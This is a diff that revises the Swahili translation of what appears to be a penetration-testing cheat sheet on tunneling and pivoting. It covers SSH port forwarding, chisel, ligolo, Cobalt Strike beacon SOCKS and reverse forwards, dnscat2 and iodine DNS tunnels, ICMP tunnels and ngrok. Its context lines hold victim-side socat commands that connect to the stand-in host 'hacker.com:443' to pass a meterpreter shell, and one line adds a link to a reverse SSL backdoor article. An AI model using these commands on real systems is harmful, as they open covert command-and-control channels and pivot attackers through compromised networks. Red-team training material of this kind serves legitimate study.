@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo lazima **tuondoe kugundua ping** (`-Pn`) na kubaini **TCP skani** (`-sT`) ili hii ifanye kazi.
+> **ICMP** na **SYN** skani haziwezekani kupitishwa kupitia socks proxies, hivyo tunapaswa **kuondoa kugundua ping** (`-Pn`) na kubainisha **TCP skani** (`-sT`) ili hii ifanye kazi.
 
 ## **Bash**
 
@@ -33,7 +33,7 @@ ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
 ### Local Port2Port
 
-Fungua Bandari Mpya kwenye SSH Server --> Bandari nyingine
+Fungua Bandari Mpya kwenye SSH Server --> Bandari Nyingine
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
 ```
@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Porti za ndani --> Kihosti kilichoshambuliwa (SSH) --> Popote
+Local Port --> Compromised host (SSH) --> Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Washa uhamasishaji upande wa Server
+Washa upitishaji upande wa Server
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Porti za ndani --> Kituo kilichovunjwa (kipindi kinachofanya kazi) --> Sanduku_tatu:Port
+Local port --> Compromised host (active session) --> Third_box:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Fungua bandari katika teamserver inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
+Fungua bandari katika server ya timu inayosikiliza kwenye interfaces zote ambazo zinaweza kutumika **kuelekeza trafiki kupitia beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -150,17 +150,17 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Ili kuzingatia:
+To note:
 
 - Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
 - Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
-- **Haki za admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
+- **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
 
 > [!WARNING]
 > Katika kesi hii, **bandari imefunguliwa katika mwenyeji wa beacon**, sio katika Team Server na **trafiki inatumwa kwa mteja wa Cobalt Strike** (sio kwa Team Server) na kutoka hapo kwa mwenyeji:bandari iliyoonyeshwa.
-```
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -186,7 +186,7 @@ Unahitaji kutumia **toleo sawa kwa mteja na seva**
 ./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
 ./chisel client -v 10.10.10.10:8080 socks #Attacker
 ```
-### Uhamasishaji wa bandari
+### Kuelekeza bandari
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Agent Binding and Listening
+### Kuweka na Kusikiliza kwa Wakala
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -286,10 +286,12 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathirika:
+Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho katika konso ya mwathirika:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tunnel
 
 **/bin/sh console**
@@ -366,7 +368,7 @@ Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupanua trafi
 
 ## Proxify Windows GUI Apps
 
-Unaweza kufanya programu za Windows GUI zipitie kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
+Unaweza kufanya programu za Windows GUI zipite kupitia proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
 Katika **Profile -> Proxy Servers** ongeza IP na bandari ya seva ya SOCKS.\
 Katika **Profile -> Proxification Rules** ongeza jina la programu ya kupanua na muunganisho kwa IP unazotaka kupanua.
 
@@ -381,8 +383,8 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Inathibitisha dhidi ya proxy na inafunga bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
-Kwa mfano, inapeleka bandari 443
+Inathibitisha dhidi ya proxy na kuunganisha bandari kwa ndani ambayo inapelekwa kwa huduma ya nje unayoelekeza. Kisha, unaweza kutumia chombo chochote unachokipenda kupitia bandari hii.\
+Kwa mfano, hiyo inapeleka bandari 443
 ```
 Username Alice
 Password P@ssw0rd
@@ -390,8 +392,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sasa, ikiwa unakamilisha kwa mfano katika mwathirika huduma ya **SSH** kusikiliza kwenye bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
-Unaweza pia kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza kwenye bandari 2222.
+Sasa, ikiwa utaweka kwa mfano katika mwathirika huduma ya **SSH** kusikiliza katika bandari 443. Unaweza kuungana nayo kupitia bandari ya mshambuliaji 2222.\
+Pia unaweza kutumia **meterpreter** inayounganisha na localhost:443 na mshambuliaji anasikiliza katika bandari 2222.
 
 ## YARP
 
@@ -403,21 +405,21 @@ Kipindi cha kurudi kilichoundwa na Microsoft. Unaweza kukipata hapa: [https://gi
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
+Root inahitajika katika mifumo yote ili kuunda tun adapters na kupitisha data kati yao kwa kutumia maswali ya DNS.
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tuneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH uliofinyangwa kupitia tuneli hii kwa kutumia:
+Tuneli itakuwa polepole sana. Unaweza kuunda muunganisho wa SSH ulioshinikizwa kupitia tuneli hii kwa kutumia:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**
+[**Download it from here**](https://github.com/iagox86/dnscat2)**.**
 
-Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za root.
+Inaunda channel ya C\&C kupitia DNS. Haihitaji ruhusa za mzizi.
 ```bash
 attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
@@ -440,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Badilisha DNS ya proxychains
 
-Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
+Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
 
 ## Tunnels katika Go
 
@@ -453,7 +455,7 @@ Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupi
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root inahitajika katika mifumo yote ili kuunda tun adapters na kutunga data kati yao kwa kutumia ombi la ICMP echo.
+Root inahitajika katika mifumo yote miwili ili kuunda tun adapters na kutunga data kati yao kwa kutumia ombi la ICMP echo.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -494,7 +496,7 @@ chmod a+x ./ngrok
 
 **Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
+_Ipo pia uwezekano wa kuongeza uthibitisho na TLS, ikiwa ni lazima._
 
 #### Tunneling TCP
 ```bash
@@ -504,7 +506,7 @@ _Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
 # Listen (example): nc -nvlp 4444
 # Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
 ```
-#### Kuweka wazi faili kwa HTTP
+#### Kuonyesha faili kwa kutumia HTTP
 ```bash
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -521,12 +523,12 @@ Moja kwa moja kutoka stdout au katika kiolesura cha HTTP [http://127.0.0.1:4040]
 # With basic auth
 ./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
 ```
-#### ngrok.yaml mfano rahisi wa usanidi
+#### ngrok.yaml mfano wa usanidi rahisi
 
 Inafungua mabwawa 3:
 
 - 2 TCP
-- 1 HTTP na uonyeshaji wa faili za kudumu kutoka /tmp/httpbin/
+- 1 HTTP yenye uwasilishaji wa faili za kudumu kutoka /tmp/httpbin/
 ```yaml
 tunnels:
 mytcp:
